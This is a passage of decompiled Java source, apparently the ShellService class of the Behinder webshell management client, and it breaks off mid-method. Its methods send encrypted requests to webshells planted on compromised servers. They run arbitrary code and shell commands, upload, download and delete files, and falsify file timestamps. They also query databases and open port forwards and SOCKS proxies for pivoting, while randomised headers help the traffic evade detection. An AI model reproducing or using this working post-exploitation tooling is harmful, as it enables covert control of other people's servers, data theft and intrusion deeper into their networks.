//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package net.rebeyond.behinder.core;

import java.io.FileOutputStream;
import java.lang.reflect.InvocationTargetException;
import java.net.URL;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import javafx.application.Platform;
import javafx.scene.control.Alert;
import javafx.scene.control.Alert.AlertType;
import javafx.stage.Window;
import javax.crypto.IllegalBlockSizeException;
import net.rebeyond.behinder.entity.BShell;
import net.rebeyond.behinder.entity.DecryptException;
import net.rebeyond.behinder.service.OfflineHelper;
import net.rebeyond.behinder.utils.Utils;
import org.json.JSONObject;

public class ShellService implements IShellService {
    public String currentUrl;
    public String currentPassword;
    public String currentKey;
    public String currentType;
    public String childType;
    public String effectType;
    public Map<String, String> currentHeaders;
    public Map<String, Map<String, String>> scriptHeaders;
    public int encryptType;
    private int compareMode;
    public int beginIndex;
    public int endIndex;
    public byte[] prefixBytes;
    public byte[] suffixBytes;
    public JSONObject shellEntity;
    public static int BUFFSIZE = 46080;
    public static Map<String, Object> currentProxy;
    private boolean needTransfer;
    private BShell currentBShell;
    private JSONObject effectShellEntity;
    private OfflineHelper offlineHelper;
    private String sessionId;
    private ICrypt cryptor;
    private List<Map<String, Object>> childList;
    private List<JSONObject> shellChains;

    public ICrypt getCryptor() {
        return this.cryptor;
    }

    public List<Map<String, Object>> getChildList() {
        return this.childList;
    }

    public void setChildList(List<Map<String, Object>> childList) {
        this.childList = childList;
    }

    public JSONObject getEffectShellEntity() {
        return this.effectShellEntity;
    }

    private ICrypt getCryptor(int transProtocolId) {
        ICrypt cryptor = null;
        if (transProtocolId >= 0) {
            try {
                cryptor = new CustomCryptor(transProtocolId, Utils.getKey("rebeyond"));
                cryptor.getDecodeClsBytes();
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            try {
                cryptor = new LegacyCryptor(this.effectType, this.encryptType, this.currentKey);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        return cryptor;
    }

    private void init() {
        if (this.effectType.equals("aspx") || this.effectType.equals("dotnetCore")) {
            this.sessionId = Utils.getRandomAlpha(16);
        }

    }

    public ShellService(JSONObject shellEntity) throws Exception {
        this.encryptType = Constants.ENCRYPT_TYPE_AES;
        this.compareMode = 0;
        this.beginIndex = 0;
        this.endIndex = 0;
        this.needTransfer = false;
        this.shellChains = new ArrayList();
        this.shellEntity = shellEntity;
        this.effectShellEntity = shellEntity;
        this.currentUrl = shellEntity.getString("url");
        this.currentType = shellEntity.getString("type");
        this.currentPassword = shellEntity.getString("password");
        this.currentKey = Utils.getKey(this.currentPassword);
        this.currentHeaders = new HashMap();
        this.effectType = this.currentType;
        this.cryptor = this.getCryptor(shellEntity.getInt("transProtocolId"));

        try {
            this.offlineHelper = new OfflineHelper(shellEntity.getInt("id"));
        } catch (Exception e) {
            System.out.println("离线模块初始化失败：" + e.getMessage());
        }

        this.init();
        this.initHeaders();
        this.mergeHeaders(this.currentHeaders, shellEntity.optString("headers", ""));
    }

    public ShellService(JSONObject shellEntity, List<Map<String, Object>> childList) throws Exception {
        this.encryptType = Constants.ENCRYPT_TYPE_AES;
        this.compareMode = 0;
        this.beginIndex = 0;
        this.endIndex = 0;
        this.needTransfer = false;
        this.shellChains = new ArrayList();
        this.shellEntity = shellEntity;
        this.currentUrl = shellEntity.getString("url");
        this.currentType = shellEntity.getString("type");
        this.currentPassword = shellEntity.getString("password");
        this.currentHeaders = new HashMap();
        this.needTransfer = true;
        this.childList = childList;
        this.shellChains.add(shellEntity);

        for(Map<String, Object> childObj : childList) {
            JSONObject childShellEntity = (JSONObject)childObj.get("childShellEntity");
            this.shellChains.add(childShellEntity);
            String scriptType = childShellEntity.getString("type");
            this.scriptHeaders = new HashMap();
            Map<String, String> scriptHeader = new HashMap();
            this.initHeardersByType(scriptType, scriptHeader);
            this.scriptHeaders.put(scriptType, scriptHeader);
        }

        this.effectShellEntity = (JSONObject)((Map)Utils.getLastOfList(childList)).get("childShellEntity");
        this.effectType = this.effectShellEntity.getString("type");
        this.currentBShell = (BShell)this.effectShellEntity.get("bShell");
        this.cryptor = this.getCryptor(shellEntity.getInt("transProtocolId"));
        this.offlineHelper = new OfflineHelper(shellEntity.getInt("id"));
        this.init();
        this.initHeaders();
        this.mergeHeaders(this.currentHeaders, shellEntity.optString("headers", ""));
    }

    private void initHeardersByType(String type, Map<String, String> headers) {
        if (type.equals("php")) {
            headers.put("Content-type", "application/x-www-form-urlencoded");
        } else if (type.equals("aspx")) {
            headers.put("Content-Type", "application/octet-stream");
        } else if (type.equals("jsp")) {
        }

        this.initHeardersCommon(type, headers);
    }

    private void initHeardersCommon(String type, Map<String, String> headers) {
        headers.put("Accept", this.getCurrentAccept());
        headers.put("Accept-Language", "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7");
        headers.put("User-Agent", this.getCurrentUserAgent());
        if (((String)headers.get("User-Agent")).toLowerCase().indexOf("firefox") >= 0) {
        }

        headers.put("Referer", this.getReferer());
    }

    private void initHeaders() {
        this.initHeardersByType(this.currentType, this.currentHeaders);
    }

    private String getReferer() {
        URL u = null;

        try {
            u = new URL(this.effectShellEntity.getString("url"));
            String oldPath = u.getPath();
            String newPath = "";
            String ext = oldPath.substring(oldPath.lastIndexOf("."));
            oldPath = oldPath.substring(0, oldPath.lastIndexOf("."));
            String[] parts = oldPath.split("/");

            for(int i = 0; i < parts.length; ++i) {
                if (parts[i].length() != 0) {
                    if ((new Random()).nextBoolean()) {
                        int randomNum = (new Random()).nextInt(parts[i].length());
                        if (randomNum == 0) {
                            randomNum = 4;
                        }

                        String randStr = (new Random()).nextBoolean() ? Utils.getRandomString(randomNum).toLowerCase() : Utils.getRandomString(randomNum).toUpperCase();
                        newPath = newPath + "/" + randStr;
                    } else {
                        newPath = newPath + "/" + parts[i];
                    }
                }
            }

            newPath = newPath + ext;
            String refer = this.currentUrl.replace(u.getPath(), newPath);
            return refer;
        } catch (Exception var10) {
            return this.currentUrl;
        }
    }

    private String getCurrentUserAgent() {
        int uaIndex = (new Random()).nextInt(Constants.userAgents.length - 1);
        String currentUserAgent = Constants.userAgents[uaIndex];
        return currentUserAgent;
    }

    private String getCurrentAccept() {
        int acIndex = (new Random()).nextInt(Constants.accepts.length - 1);
        String currentAccept = Constants.accepts[acIndex];
        return currentAccept;
    }

    public void setProxy(Map<String, Object> proxy) {
        currentProxy = proxy;
    }

    public Map<String, Object> getProxy(Map<String, Object> proxy) {
        return currentProxy;
    }

    public JSONObject getShellEntity() {
        return this.shellEntity;
    }

    private void mergeHeaders(Map<String, String> headers, String headerTxt) {
        for(String line : headerTxt.split("\n")) {
            int semiIndex = line.indexOf(":");
            if (semiIndex > 0) {
                String key = line.substring(0, semiIndex);
                key = this.formatHeaderName(key);
                String value = line.substring(semiIndex + 1);
                if (!value.equals("")) {
                    headers.put(key, value);
                }
            }
        }

    }

    private String formatHeaderName(String beforeName) {
        String afterName = "";

        for(String element : beforeName.split("-")) {
            element = (element.charAt(0) + "").toUpperCase() + element.substring(1).toLowerCase();
            afterName = afterName + element + "-";
        }

        if (afterName.length() - beforeName.length() == 1 && afterName.endsWith("-")) {
            afterName = afterName.substring(0, afterName.length() - 1);
        }

        return afterName;
    }

    public boolean doConnect() throws Exception {
        boolean result = false;
        int randStringLength = (new SecureRandom()).nextInt(3000);
        String content = Utils.getRandomString(randStringLength);
        JSONObject obj = null;

        try {
            obj = this.echo(content);
        } catch (DecryptException e) {
            if (!this.effectType.equals("php") || this.cryptor.isCustomized()) {
                throw e;
            }

            this.encryptType = Constants.ENCRYPT_TYPE_XOR;
            this.cryptor = this.getCryptor(-1);
            obj = this.echo(content);
        }

        if (obj.getString("msg").equals(content)) {
            result = true;
        }

        return result;
    }

    public String evalWithTransProtocol(String sourceCode) throws Exception {
        String result = null;
        byte[] payload = null;
        if (this.effectType.equals("jsp")) {
            payload = Utils.getClassFromSourceCode(sourceCode);
        } else {
            payload = sourceCode.getBytes();
        }

        byte[] data = Utils.getEvalDataWithTransprotocol(this.cryptor, this.currentKey, this.effectType, payload);
        Map<String, Object> resultObj = this.doRequestAndParse(data);
        byte[] resData = (byte[])resultObj.get("data");
        result = new String(resData);
        Map<String, String> params = new HashMap();
        params.put("sourceCode", sourceCode);
        JSONObject evalResult = new JSONObject();
        evalResult.put("msg", result);
        evalResult.put("status", "success");
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), params, evalResult);
        return result;
    }

    public String eval(String sourceCode) throws Exception {
        String result = null;
        byte[] payload = null;
        if (this.effectType.equals("jsp")) {
            payload = Utils.getClassFromSourceCode(sourceCode);
            payload[7] = 49;
        } else {
            payload = sourceCode.getBytes();
        }

        byte[] data = Utils.getEvalData(this.cryptor, this.effectType, payload);
        Map<String, Object> resultObj = this.doRequestAndParse(data);
        byte[] resData = (byte[])resultObj.get("data");
        result = new String(resData);
        Map<String, String> params = new HashMap();
        params.put("sourceCode", sourceCode);
        JSONObject evalResult = new JSONObject();
        evalResult.put("msg", result);
        evalResult.put("status", "success");
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), params, evalResult);
        return result;
    }

    public JSONObject runCmd(String cmd, String path) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("cmd", cmd);
        params.put("path", path);
        JSONObject result = this.parseCommonAction("Cmd", params);
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), params, result);
        return result;
    }

    public JSONObject createBShell(String target) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "create");
        params.put("target", target);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "BShell", params, this.currentType);
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
        JSONObject result = new JSONObject(resultTxt);

        for(String key : result.keySet()) {
            result.put(key, new String(Base64.getDecoder().decode(result.getString(key)), "UTF-8"));
        }

        return result;
    }

    public JSONObject listBShell() throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "list");
        JSONObject result = this.parseCommonAction("BShell", params);
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), params, result);
        return result;
    }

    public JSONObject listReverseBShell() throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "listReverse");
        JSONObject result = this.parseCommonAction("BShell", params);
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), params, result);
        return result;
    }

    public JSONObject listenBShell(String listenPort) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "listen");
        params.put("listenPort", listenPort);
        JSONObject result = this.parseCommonAction("BShell", params);
        return result;
    }

    public JSONObject closeBShell(String target, String type) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "close");
        params.put("target", target);
        params.put("type", type);
        JSONObject result = this.parseCommonAction("BShell", params);
        return result;
    }

    public JSONObject stopReverseBShell() throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "stopReverse");
        JSONObject result = this.parseCommonAction("BShell", params);
        return result;
    }

    public JSONObject sendBShellCommand(String target, String action, String actionParams) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", action);
        params.put("target", target);
        params.put("params", actionParams);
        JSONObject result = this.parseCommonAction("BShell", params);
        return result;
    }

    public JSONObject submitPluginTask(String taskID, String payloadPath, Map<String, String> pluginParams) throws Exception {
        byte[] pluginData = Utils.getPluginData(this.currentKey, payloadPath, pluginParams, this.currentType);
        String payload = Base64.getEncoder().encodeToString(pluginData);
        Map<String, String> params = new HashMap();
        params.put("taskID", taskID);
        params.put("action", "submit");
        params.put("payload", payload);
        int blockSize = 65535;
        JSONObject result;
        if (this.effectType.equals("php")) {
            String oldAcceptEncoding = "";
            if (this.currentHeaders.containsKey("Accept-Encoding")) {
                oldAcceptEncoding = (String)this.currentHeaders.get("Accept-Encoding");
            }

            this.currentHeaders.put("Accept-Encoding", "identity");

            try {
                result = this.parseCommonAction("Plugin", params);
            } catch (Exception var14) {
                result = new JSONObject();
                result.put("status", "success");
                result.put("msg", "ok");
            } finally {
                if (!oldAcceptEncoding.equals("")) {
                    this.currentHeaders.put("Accept-Encoding", oldAcceptEncoding);
                } else {
                    this.currentHeaders.remove("Accept-Encoding");
                }

            }
        } else if (this.effectType.equals("jsp") && payload.length() > blockSize) {
            int count = payload.length() / blockSize;
            int remaining = payload.length() % blockSize;

            for(int i = 0; i < count; ++i) {
                params.put("payload", payload.substring(i * blockSize, i * blockSize + blockSize));
                params.put("action", "append");
                result = this.parseCommonAction("Plugin", params);
                if (!result.getString("status").equals("success")) {
                    throw new Exception("插件上传失败。");
                }
            }

            if (remaining > 0) {
                params.put("payload", payload.substring(count * blockSize, count * blockSize + remaining));
                params.put("action", "append");
                result = this.parseCommonAction("Plugin", params);
                if (!result.getString("status").equals("success")) {
                    throw new Exception("插件上传失败。");
                }
            }

            params.put("action", "submit");
            params.put("payload", "");
            result = this.parseCommonAction("Plugin", params);
        } else {
            result = this.parseCommonAction("Plugin", params);
        }

        return result;
    }

    public JSONObject execPluginTask(String taskID, String payloadPath, Map<String, String> pluginParams) throws Exception {
        byte[] pluginData = Utils.getPluginData(this.currentKey, payloadPath, pluginParams, this.currentType);
        Map<String, String> params = new HashMap();
        params.put("taskID", taskID);
        params.put("action", "exec");
        params.put("payload", Base64.getEncoder().encodeToString(pluginData));
        JSONObject result = this.parseCommonAction("Plugin", params);
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), params, result);
        return result;
    }

    public JSONObject getPluginTaskResult(String taskID) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("taskID", taskID);
        params.put("action", "getResult");
        JSONObject result = this.parseCommonAction("Plugin", params);
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), params, result);
        return result;
    }

    public JSONObject stopPluginTask(String taskID) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("taskID", taskID);
        params.put("action", "stop");
        JSONObject result = this.parseCommonAction("Plugin", params);
        return result;
    }

    public JSONObject loadJar(String libPath) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("libPath", libPath);
        JSONObject result = this.parseCommonAction("Loader", params);
        return result;
    }

    public JSONObject createRealCMD(String bashPath) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("type", "create");
        params.put("bashPath", bashPath);
        if (this.currentType.equals("php")) {
            params.put("cmd", "");
        }

        params.put("whatever", Utils.getWhatever());
        JSONObject result = this.parseCommonAction("RealCMD", params);
        return result;
    }

    public JSONObject stopRealCMD() throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("type", "stop");
        if (this.currentType.equals("php")) {
            params.put("bashPath", "");
            params.put("cmd", "");
        }

        params.put("whatever", Utils.getWhatever());
        JSONObject result = this.parseCommonAction("RealCMD", params);
        return result;
    }

    public JSONObject readRealCMD() throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("type", "read");
        if (this.currentType.equals("php")) {
            params.put("bashPath", "");
            params.put("cmd", "");
        }

        params.put("whatever", Utils.getWhatever());
        JSONObject result = this.parseCommonAction("RealCMD", params);
        return result;
    }

    public JSONObject writeRealCMD(String cmd) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("type", "write");
        if (this.currentType.equals("php")) {
            params.put("bashPath", "");
        }

        params.put("cmd", Base64.getEncoder().encodeToString(cmd.getBytes()));
        JSONObject result = this.parseCommonAction("RealCMD", params);
        return result;
    }

    public JSONObject listFiles(String path) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("mode", "list");
        params.put("path", path);
        JSONObject result = this.parseCommonAction("FileOperation", params);
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), params, result);
        return result;
    }

    public JSONObject checkFileHash(String path, String hash) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("mode", "check");
        params.put("path", path);
        params.put("hash", hash);
        JSONObject result = this.parseCommonAction("FileOperation", params);
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), params, result);
        return result;
    }

    public JSONObject getTimeStamp(String path) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("mode", "getTimeStamp");
        params.put("path", path);
        JSONObject result = this.parseCommonAction("FileOperation", params);
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), params, result);
        return result;
    }

    public JSONObject updateTimeStamp(String path, String createTimeStamp, String modifyTimeStamp, String accessTimeStamp) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("mode", "updateTimeStamp");
        params.put("path", path);
        params.put("createTimeStamp", createTimeStamp);
        params.put("accessTimeStamp", accessTimeStamp);
        params.put("modifyTimeStamp", modifyTimeStamp);
        JSONObject result = this.parseCommonAction("FileOperation", params);
        return result;
    }

    public JSONObject updateModifyTimeStamp(String path, String modifyTimeStamp) throws Exception {
        return this.updateTimeStamp(path, "", modifyTimeStamp, "");
    }

    public JSONObject deleteFile(String path) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("mode", "delete");
        params.put("path", path);
        JSONObject result = this.parseCommonAction("FileOperation", params);
        return result;
    }

    public JSONObject compress(String path) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("mode", "compress");
        params.put("path", path);
        JSONObject result = this.parseCommonAction("FileOperation", params);
        return result;
    }

    public JSONObject showFile(String path, String charset) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("mode", "show");
        params.put("path", path);
        if (this.currentType.equals("php")) {
            params.put("content", "");
        } else if (this.currentType.equals("asp")) {
        }

        if (charset != null) {
            params.put("charset", charset);
        }

        JSONObject result = this.parseCommonAction("FileOperation", params);
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), params, result);
        return result;
    }

    public JSONObject checkFileExist(String path) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("mode", "checkExist");
        params.put("path", path);
        JSONObject result = this.parseCommonAction("FileOperation", params);
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), params, result);
        return result;
    }

    public JSONObject renameFile(String oldName, String newName) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("mode", "rename");
        params.put("path", oldName);
        if (this.currentType.equals("php")) {
            params.put("content", "");
            params.put("charset", "");
        }

        params.put("newPath", newName);
        JSONObject result = this.parseCommonAction("FileOperation", params);
        return result;
    }

    public JSONObject createFile(String fileName) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("mode", "createFile");
        params.put("path", fileName);
        JSONObject result = this.parseCommonAction("FileOperation", params);
        return result;
    }

    public JSONObject createDirectory(String dirName) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("mode", "createDirectory");
        params.put("path", dirName);
        JSONObject result = this.parseCommonAction("FileOperation", params);
        return result;
    }

    public void downloadFile(String remotePath, String localPath) throws Exception {
        byte[] fileContent = null;
        Map<String, String> params = new LinkedHashMap();
        params.put("mode", "download");
        params.put("path", remotePath);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
        fileContent = (byte[])Utils.sendPostRequestBinary(this.currentUrl, this.currentHeaders, data).get("data");
        FileOutputStream fso = new FileOutputStream(localPath);
        fso.write(fileContent);
        fso.flush();
        fso.close();
    }

    public JSONObject execSQL(String type, String host, String port, String user, String pass, String database, String sql) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("type", type);
        params.put("host", host);
        params.put("port", port);
        params.put("user", user);
        params.put("pass", pass);
        params.put("database", database);
        params.put("sql", sql);
        JSONObject result = this.parseCommonAction("Database", params);
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), params, result);
        return result;
    }

    public JSONObject uploadFile(String remotePath, byte[] fileContent, boolean useBlock) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        JSONObject result = null;
        if (!useBlock) {
            params.put("mode", "create");
            params.put("path", remotePath);
            params.put("content", Base64.getEncoder().encodeToString(fileContent));
            result = this.parseCommonAction("FileOperation", params);
        } else {
            List<byte[]> blocks = Utils.splitBytes(fileContent, BUFFSIZE*20);

            for(int i = 0; i < blocks.size(); ++i) {
                if (i == 0) {
                    params.put("mode", "create");
                } else {
                    params.put("mode", "append");
                }

                params.put("path", remotePath);
                params.put("content", Base64.getEncoder().encodeToString((byte[])blocks.get(i)));
                byte[] data = Utils.getData(this.cryptor, "FileOperation", params, this.currentType);
                Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
                byte[] resData = (byte[])resultObj.get("data");
                String resultTxt = new String(this.cryptor.decrypt(extractPayload(resData, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes)));
                result = new JSONObject(resultTxt);

                for(String key : result.keySet()) {
                    result.put(key, new String(Base64.getDecoder().decode(result.getString(key)), "UTF-8"));
                }
            }
        }

        return result;
    }

    public JSONObject uploadFile(String remotePath, byte[] fileContent) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("mode", "create");
        params.put("path", remotePath);
        params.put("content", Base64.getEncoder().encodeToString(fileContent));
        byte[] data = Utils.getData(this.cryptor, "FileOperation", params, this.currentType);
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(this.cryptor.decrypt(extractPayload(resData, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes)));
        JSONObject result = new JSONObject(resultTxt);

        for(String key : result.keySet()) {
            result.put(key, new String(Base64.getDecoder().decode(result.getString(key)), "UTF-8"));
        }

        return result;
    }

    public JSONObject appendFile(String remotePath, byte[] fileContent) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("mode", "append");
        params.put("path", remotePath);
        params.put("content", Base64.getEncoder().encodeToString(fileContent));
        byte[] data = Utils.getData(this.cryptor, "FileOperation", params, this.currentType);
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(this.cryptor.decrypt(extractPayload(resData, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes)));
        JSONObject result = new JSONObject(resultTxt);

        for(String key : result.keySet()) {
            result.put(key, new String(Base64.getDecoder().decode(result.getString(key)), "UTF-8"));
        }

        return result;
    }

    public JSONObject uploadFilePart(String remotePath, byte[] fileContent, long blockIndex, long blockSize) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("mode", "update");
        params.put("path", remotePath);
        params.put("blockIndex", blockIndex + "");
        params.put("blockSize", blockSize + "");
        params.put("content", Base64.getEncoder().encodeToString(fileContent));
        JSONObject result = this.parseCommonAction("FileOperation", params);
        return result;
    }

    public JSONObject downFilePart(String remotePath, long blockIndex, long blockSize) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("mode", "downloadPart");
        params.put("path", remotePath);
        params.put("blockIndex", blockIndex + "");
        params.put("blockSize", blockSize + "");
        JSONObject result = this.parseCommonAction("FileOperation", params);
        return result;
    }

    public boolean checkClassExist(String className) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "checkClassExist");
        params.put("className", className);
        JSONObject result = this.parseCommonAction("Utils", params);
        if (result.getString("status").equals("success")) {
            return result.getBoolean("msg");
        } else {
            throw new Exception(result.getString("msg"));
        }
    }

    public JSONObject createRemotePortMap(String targetIP, String targetPort, String remoteIP, String remotePort) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "createRemote");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        params.put("remoteIP", remoteIP);
        params.put("remotePort", remotePort);
        JSONObject result;
        if (this.effectType.equals("php")) {
            String oldAcceptEncoding = "";
            if (this.currentHeaders.containsKey("Accept-Encoding")) {
                oldAcceptEncoding = (String)this.currentHeaders.get("Accept-Encoding");
            }

            this.currentHeaders.put("Accept-Encoding", "identity");

            try {
                result = this.parseCommonAction("PortMap", params);
            } catch (Exception var12) {
                result = new JSONObject();
                result.put("status", "success");
                result.put("msg", "ok");
            } finally {
                if (!oldAcceptEncoding.equals("")) {
                    this.currentHeaders.put("Accept-Encoding", oldAcceptEncoding);
                } else {
                    this.currentHeaders.remove("Accept-Encoding");
                }

            }
        } else {
            result = this.parseCommonAction("PortMap", params);
        }

        return result;
    }

    public JSONObject createRemoteSocks(String targetIP, String targetPort, String remoteIP, String remotePort) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "createRemote");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        params.put("remoteIP", remoteIP);
        params.put("remotePort", remotePort);
        JSONObject result = this.parseCommonAction("PortMap", params);
        return result;
    }

    public JSONObject createVPSSocks(String remoteIP, String remotePort) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "create");
        params.put("remoteIP", remoteIP);
        params.put("remotePort", remotePort);
        JSONObject result;
        if (this.effectType.equals("php")) {
            String oldAcceptEncoding = "";
            if (this.currentHeaders.containsKey("Accept-Encoding")) {
                oldAcceptEncoding = (String)this.currentHeaders.get("Accept-Encoding");
            }

            this.currentHeaders.put("Accept-Encoding", "identity");

            try {
                result = this.parseCommonAction("RemoteSocksProxy", params);
            } catch (Exception var10) {
                result = new JSONObject();
                result.put("status", "success");
                result.put("msg", "ok");
            } finally {
                if (!oldAcceptEncoding.equals("")) {
                    this.currentHeaders.put("Accept-Encoding", oldAcceptEncoding);
                } else {
                    this.currentHeaders.remove("Accept-Encoding");
                }

            }
        } else {
            result = this.parseCommonAction("RemoteSocksProxy", params);
        }

        return result;
    }

    public JSONObject stopVPSSocks() throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "stop");
        JSONObject result = this.parseCommonAction("RemoteSocksProxy", params);
        return result;
    }

    public JSONObject createPortMap(String targetIP, String targetPort, String socketHash) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "createLocal");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        params.put("socketHash", socketHash);
        JSONObject result;
        if (this.effectType.equals("php")) {
            String oldAcceptEncoding = "";
            if (this.currentHeaders.containsKey("Accept-Encoding")) {
                oldAcceptEncoding = (String)this.currentHeaders.get("Accept-Encoding");
            }

            this.currentHeaders.put("Accept-Encoding", "identity");

            try {
                result = this.parseCommonAction("PortMap", params);
            } catch (Exception var11) {
                result = new JSONObject();
                result.put("status", "success");
                result.put("msg", "ok");
            } finally {
                if (!oldAcceptEncoding.equals("")) {
                    this.currentHeaders.put("Accept-Encoding", oldAcceptEncoding);
                } else {
                    this.currentHeaders.remove("Accept-Encoding");
                }

            }
        } else {
            result = this.parseCommonAction("PortMap", params);
        }

        return result;
    }

    public JSONObject readPortMapData(String targetIP, String targetPort, String socketHash) throws Exception {
        byte[] resData = null;
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "read");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        params.put("socketHash", socketHash);
        JSONObject result = this.parseCommonAction("PortMap", params);
        return result;
    }

    public JSONObject writePortMapData(byte[] proxyData, String targetIP, String targetPort, String socketHash) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "write");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        params.put("socketHash", socketHash);
        if (this.currentType.equals("php")) {
            params.put("remoteIP", "");
            params.put("remotePort", "");
        }

        params.put("extraData", Base64.getEncoder().encodeToString(proxyData));
        JSONObject result = this.parseCommonAction("PortMap", params);
        return result;
    }

    public JSONObject closeLocalPortMap(String targetIP, String targetPort) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "closeLocal");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        byte[] data = Utils.getData(this.cryptor, "PortMap", params, this.currentType);
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(this.cryptor.decrypt(extractPayload(resData, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes)));
        JSONObject result = new JSONObject(resultTxt);
        return result;
    }

    public boolean closeLocalPortMapWorker(String socketHash) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "closeLocalWorker");
        params.put("socketHash", socketHash);
        byte[] data = Utils.getData(this.cryptor, "PortMap", params, this.currentType);
        Map<String, String> resHeader = (Map)Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes).get("header");
        return ((String)resHeader.get("status")).equals("200");
    }

    public boolean closeRemotePortMap() throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "closeRemote");
        JSONObject result = this.parseCommonAction("PortMap", params);
        return result.getString("status").equals("success");
    }

    public JSONObject readProxyData(String socketHash) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "read");
        params.put("socketHash", socketHash);
        JSONObject result = this.parseCommonAction("SocksProxy", params);
        return result;
    }

    public JSONObject writeProxyData(byte[] proxyData, String socketHash) throws Exception {
